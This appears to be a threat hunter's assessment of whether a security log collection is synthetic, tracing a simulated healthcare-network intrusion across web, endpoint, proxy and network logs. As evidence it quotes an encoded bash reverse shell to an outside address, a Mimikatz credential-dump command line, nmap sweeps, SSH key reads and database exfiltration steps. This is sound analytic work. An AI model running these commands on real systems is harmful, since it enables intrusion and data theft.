# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Inconclusive  
**Verdict Confidence:** 82  
**Synthetic-Confidence Score:** 45

## Executive Summary

Most of the six-hour collection is operationally convincing: the environment has believable source volumes and noise, and the principal hunt pivots preserve endpoints, ports, identities, processes, and lifecycle ordering across web, endpoint, network, authentication, proxy, and firewall evidence. The strongest synthetic signal is a source-wide proxy outcome texture in which denied and authentication-required CONNECT requests almost uniformly receive nonzero “tunnel” accounting and nearly fixed subsecond durations; a secondary collection gap is endpoint-visible time synchronization without any corresponding UDP/123 traffic.

## Evidence For Synthetic

- `[distribution_texture]` All 24 proxy-denied CONNECT transactions carrying `tunnel_duration_ms` cluster between 457 and 480 ms, despite coming from different clients and applications. Examples include `arc.msn.com` at 12:18:44 (`462` ms), `static.akamai.net` at 12:19:12 (`479` ms), `pypi.org` at 12:50:44 (`464` ms), and C2 address `45.33.32.30` at 16:34:11 (`465` ms). The 407 authentication-required CONNECT population has essentially the same floor, with most values between 456 and 480 ms. That narrow, outcome-specific timing band looks parameterized rather than organically measured.
- `[schema_or_format]` Those denied CONNECT records also contain nonzero `tunnel_cs_bytes` and `tunnel_sc_bytes` while declaring `proxy_action=deny`, `ssl_bump=terminate`, and `byte_scope=connect-control-message`. For example, the 12:18:44 denial has `tunnel_cs_bytes=453 tunnel_sc_bytes=1104`; the 12:19:12 denial has `529/1477`. A rejected CONNECT has no established upstream tunnel, so recording a populated tunnel lifecycle is semantically misleading even if the fields are intended to count client data sent after the denial.
- `[contract_gap]` Four Linux endpoints show five explicit `systemd-timesyncd` file updates during the visible window, including `/run/systemd/timesync/synchronized` on APP-INT-01 at 12:46:51, PROXY-01 at 14:56:47, and WS-OHADDAD-01 at 16:55:32. Yet the two Zeek `conn.json` files contain zero UDP/123 connections, and eCAR contains zero FLOW events attributed to `systemd-timesync`. Given otherwise broad endpoint and network collection, the total absence of the network side of time synchronization is conspicuous.
- `[weak_signal]` The visible web reverse shell is self-contained and terminates before the later privileged activity: WEB-EXT-01 creates the `www-data` base64-decoding bash at 13:20:15, connects to `45.33.32.30:8443`, and terminates it at 13:20:40. The discovery/lateral-movement shell instead begins with a distinct root SSH login from `10.10.1.32` at 13:39:47. That is technically possible as a separate compromised path, so it is not a contradiction, but the collection does not visibly bridge the two access paths.
- `[distribution_texture]` Administrative SSH is unusually dense and repetitive for the small environment: 173 Zeek SSH observations across the two sensors, including 13 Aisha Johnson logins to MAIL-CLIN-01, 11 Lina Nguyen logins to WEB-EXT-01, and 10 each for Marcus Chen to WEB-EXT-01 and MAIL-EDGE-01. Durations vary substantially and the commands are not identical, which limits this to a weak-to-moderate indicator rather than a decisive fingerprint.

## Evidence For Real

- The source mix is credible for a small enterprise: 18 endpoint directories across workstation, domain-controller, file, mail, proxy, web, application, and database roles; four visible network segments (`10.10.1.0/24` through `10.10.4.0/24`); and a consistent 12:00–18:00 UTC window.
- Volumes are substantial without being absurd: 26,296 eCAR records, 13,873 Windows Security events, 4,368 Sysmon events, 12,301 Zeek connections, 13,327 ASA messages, 2,910 proxy records, 879 web requests, 4,160 syslog messages, and 183 Snort alerts.
- Network texture is varied: Zeek has 10,721 `SF`, 1,172 `S0`, 180 `RSTO`, 112 `RSTR`, 43 `REJ`, and smaller `OTH`/`S1`/`S2`/`S3` populations. The DMZ web server sees 256 distinct inbound source IPs, with successful browsing interspersed among opportunistic scans and failed connections.
- The initial compromise pivots cleanly. The 13:20:12 POST from `185.70.41.45` to `/ehr/admin/upload.php` is followed by the Apache-parented `www-data` bash at 13:20:15, endpoint FLOW to `45.33.32.30:8443` at 13:20:16, Zeek UID `CKZ8KOPhVr9c7BtBPmX`, and ASA connection `1244078`; the 11-second duration and byte totals are compatible across sources.
- SSH lifecycle evidence is strong. The 13:39 root session from `10.10.1.32:64901` appears as a source-side `ssh.exe` process on WS-PPATEL-01, ASA transport, Zeek SSH connection, WEB-EXT-01 syslog authentication/session records, eCAR FLOW, login state, shell children, and an eventual close at 17:58. The long connection is not artificially collapsed.
- Lateral movement from WEB-EXT-01 to APP-INT-01 is technically coherent. The web root shell starts `ssh -tt root@APP-INT-01.meridianhcs.local` at 14:14:56; APP-INT-01 receives the connection from `10.10.3.10:39149`, accepts root at 14:15:11, creates a bash session, and retains it for later use.
- The Windows compromise path has plausible process ownership. On WS-AJOHNSON-01, `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit` runs as Aisha Johnson at 15:51:18. Later traffic from `10.10.1.35` reaches DC-01 over SMB/RPC, while DC commands are parented by `WmiPrvSE.exe`; service creation and scheduled-task persistence appear in eCAR, Sysmon, and Security events.
- Data staging preserves endpoints and actors. DB-PROD-01 receives root SSH from APP-INT-01 at 17:15:10, runs `mysqldump`, creates and compresses `/tmp/rpt_0318.sql`, then sends it via SCP from `10.10.4.10:49473` to APP-INT-01. The receiver logs public-key authentication, a short noninteractive SSH lifecycle, and file creation at `/tmp/.cache/rpt_0318.sql.gz`.
- Background behavior is diverse and role-aware: Kerberos/LDAP/SMB traffic, machine and user logons, software updates, scheduled services, mailbox SMTP, Apache browsing, database application traffic, DHCP, proxy browsing, scanner noise, failed authentications, and Linux maintenance all compete with the malicious trail.
- Lifecycle ordering checks found no visible process terminate-before-create, file read-before-create, or logout-before-login cases for identifiers that had both phases in the window.

## Detailed Analysis

### Collection orientation and source mix

The collection covers approximately six hours on 18 March 2024, from 12:00 through 18:00 UTC. The endpoint population consists of nine Windows systems with Security/Sysmon/eCAR telemetry and nine Linux systems with syslog/eCAR telemetry, supplemented by core and DMZ Zeek sensors, perimeter ASA logs, core and perimeter Snort, Squid-like proxy access logs, Apache access logs, SMTP, and shell histories.

The network topology is intelligible from the logs alone: `10.10.1.0/24` is primarily user endpoints, `10.10.2.0/24` contains domain and application infrastructure, `10.10.3.0/24` is the DMZ/proxy segment, and `10.10.4.10` is the database server. DC-01 at `10.10.2.10` provides DNS, Kerberos, and LDAP; FILE-SRV-01 is `10.10.2.20`; APP-INT-01 is `10.10.2.30`; PROXY-01 is `10.10.3.20`; WEB-EXT-01 is `10.10.3.10`; DB-PROD-01 is `10.10.4.10`.

### Initial access and command execution

At 13:20:12 the web access log records:

`185.70.41.45 ... "POST /ehr/admin/upload.php HTTP/1.1" 200 912`

Zeek DMZ records the underlying TLS connection from `185.70.41.45:50375` to `10.10.3.10:443` beginning at 13:20:12.449. WEB-EXT-01 eCAR records the inbound endpoint FLOW at 13:20:13.575.

At 13:20:15.655 Apache PID 23965 creates PID 581455 as `www-data`:

`bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`

The decoded content is a bash reverse shell to `45.33.32.30:8443`. eCAR records the outbound FLOW at 13:20:16.828 from `10.10.3.10:38555`; Zeek begins it at 13:20:16.019 with 620 origin and 1,840 response bytes; ASA builds translation and connection `1244078` at 13:20:15 and tears it down after 11 seconds with 3,100 bytes. This is excellent multi-source causal evidence.

The reverse-shell process terminates at 13:20:40.986. The later privileged shell is not this process: it is root SSH from WS-PPATEL-01 (`10.10.1.32:64901`) beginning at 13:39:47. That session is fully evidenced and technically valid, but the visible data does not establish whether it is attacker-controlled or an unfortunate legitimate administrative session whose commands overlap the intrusion.

### Discovery and lateral movement

The root SSH shell on WEB-EXT-01 performs recognizable discovery:

- 13:39:58 `ip addr show`
- 13:40:14 `cat /etc/hosts`
- 13:40:46 `cat /etc/resolv.conf`
- 13:43:05 `find /opt/ehr -name *credential* -maxdepth 3`
- 13:44:17 `nmap -sn 10.10.2.0/24`
- 13:44:24 `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`

The scan produces a believable mixture of successful, failed, and reset connections rather than uniformly open ports. At 14:00:07 the same shell reads `/var/www/html/config.php`, then `/root/.ssh/id_rsa`, and at 14:14:56 starts SSH to APP-INT-01. The target syslog records connection, password acceptance, PAM session opening, and logind session creation between 14:15:07 and 14:15:11.

That APP session later initiates root SSH to DB-PROD-01 at 17:15:03. DB-PROD-01 accepts it from `10.10.2.30:51323` at 17:15:12. The transport duration is 2,183.8 seconds, consistent with the target-side session closing at 17:51:34.

### Credential theft, Windows movement, and persistence

WS-AJOHNSON-01 has an interactive user shell that runs `whoami /all`, `net user /domain`, `net group "Domain Admins" /domain`, and `net view /domain` beginning at 15:59:44. At 16:24:38 it launches a renamed credential-dumping binary:

`C:\Windows\System32\ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`

The command is technically plausible for renamed Mimikatz. Subsequent `10.10.1.35` traffic reaches DC-01 over ports 445 and 135. On DC-01, malicious commands are spawned beneath `WmiPrvSE.exe`, which is a credible remote-WMI execution pattern:

- 16:39:47 `cmd.exe /c whoami && hostname`
- 16:55:12 domain creation of `svc_mhsync`
- 16:55:15 addition to `Domain Admins`
- 16:59:46 creation of `DeviceSyncSvc`
- 16:59:49 creation of hourly scheduled task `\Microsoft\Windows\Maintenance\DeviceSync`

At 17:09:09 `services.exe` launches `DeviceSyncSvc.exe`. This has consistent parentage, SYSTEM identity, service metadata, module loads, and later proxy/C2 traffic. The account is deleted at 17:50:07, leaving a plausible cleanup trace.

### Collection and exfiltration

FILE-SRV-01 runs as `svc_mhsync` and creates `C:\ProgramData\Microsoft\cache_7f3a.zip` from Finance and Patients shares at 17:13:40. WS-AJOHNSON-01 later copies this archive through the administrative share into the user temp directory and Chrome reads it before connecting through the explicit proxy.

In parallel, the persistent APP-INT-01 root shell reaches DB-PROD-01. From 17:15 onward the DB shell enumerates databases, dumps `ehr patients insurance_claims`, compresses the dump, inspects it, and SCPs it back to APP-INT-01. The sender eCAR, target eCAR, target syslog, and Zeek transport all agree on `10.10.4.10:49473 -> 10.10.2.30:22`. The target creates `/tmp/.cache/rpt_0318.sql.gz` under an SSH noninteractive process and closes the session about 25 seconds later.

DNS tunneling from APP-INT-01 is also visible as a dense TXT-query series to `ns1.westbridge-services.cloud` with sequence-like TXT replies and low TTLs. The intervals and label shapes vary enough to be huntable without being mechanically constant.

### Signal-to-noise and pivot feasibility

The attack is discoverable but not isolated in an empty dataset. WEB-EXT-01 receives ordinary browser sessions, TLS clients, ICMP, opportunistic port scans, and repeated unsolicited probes. The enterprise interior produces DNS, Kerberos, LDAP, SMB, RDP, SSH, DHCP, SMTP, web, proxy, MySQL, Windows service, scheduled-task, update, and maintenance activity.

Cross-source pivots are generally excellent. Source ports, destination addresses, usernames, SSH session IDs, PIDs, Zeek tuples, and proxy paths remain stable. The complete alignment was not treated as a synthetic clue; it supports operational usefulness.

The exception is time synchronization. Endpoint evidence explicitly shows `systemd-timesyncd` changing synchronization state during the window, while both network sensors and all endpoint FLOW records contain no NTP. This is not merely “another source would be helpful”: the visible endpoint activity implies a network transaction that the otherwise broad collection does not show.

### Proxy outcome behavior

The proxy is the clearest authenticity weakness. Successful tunnel durations cover a broad range—548 successful `proxy_action=tunnel` records span approximately 890 to 143,995 ms with a mean near 4,473 ms. In contrast, every denied CONNECT carrying a duration is compressed into 457–480 ms, independent of client, hostname, bytes, and application. Authentication-required CONNECTs show nearly the same fixed floor.

That outcome-conditioned texture is stronger than ordinary client timeout behavior. It is compounded by populated `tunnel_cs_bytes`, `tunnel_sc_bytes`, and `tunnel_duration_ms` on transactions explicitly marked `deny` and `ssl_bump=terminate`. This family looks generated from a narrow terminal-outcome timing model.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Impact on score |
|---|---|---|---|
| `distribution_texture` | Proxy access | Repeated across all 24 denied CONNECTs with duration metadata, and similarly across 407 responses | Highest-impact tell: outcome-specific durations occupy an implausibly narrow band |
| `schema_or_format` | Proxy access | Repeated across denied CONNECT records | Denied/terminated requests still expose populated tunnel lifecycle accounting |
| `contract_gap` | Linux eCAR and Zeek | Five timesync writes on four hosts; zero corresponding UDP/123/FLOW evidence | Makes the otherwise broad collection profile internally uneven |
| `weak_signal` | Web/eCAR/SSH | One visible transition between the short web shell and later root SSH activity | Separate access paths are possible, so this only modestly affects the score |
| `distribution_texture` | SSH baseline | Repeated across several admin/target pairs | Dense repetitive administration is noticeable, but durations and commands have enough variation to remain plausible |

## Realism Score by Category

- **Field format accuracy:** 8 — Most source-native records and identities are convincing; denied proxy tunnel metadata is the principal exception.
- **Temporal patterns:** 7 — Attack and background timing are broadly varied, but proxy denial durations are visibly outcome-template-shaped.
- **Cross-source correlation:** 8 — Web, SSH, WMI, service, staging, and SCP pivots are strong; NTP companion evidence is missing despite endpoint sync state changes.
- **Behavioral realism:** 8 — Tradecraft, process ancestry, network paths, privilege context, and lifecycle phases generally work.
- **Environmental consistency:** 7 — Host roles, subnets, and volumes fit, though the total absence of NTP and unusually dense SSH administration reduce confidence.

## Recommendations

- If this were synthetic, model denied and authentication-required CONNECT requests as terminal proxy outcomes. Do not populate upstream tunnel byte/duration fields unless an upstream tunnel actually formed; vary client-close timing according to client family, network latency, retry behavior, and response handling rather than a common approximately 460–480 ms band.
- If this were synthetic, emit the network side of active time synchronization when endpoint telemetry records `systemd-timesyncd` synchronization-state writes. At minimum, create the corresponding UDP/123 connection at the owning client and ensure it is observable on the appropriate network sensor; otherwise suppress endpoint sync-success artifacts when the network transaction is intentionally unobserved.
- If this were synthetic, broaden SSH administrative texture by reducing repeated same-user/same-target sessions and varying operational workflows, while retaining the already good duration diversity and authentic auth/session lifecycle evidence.
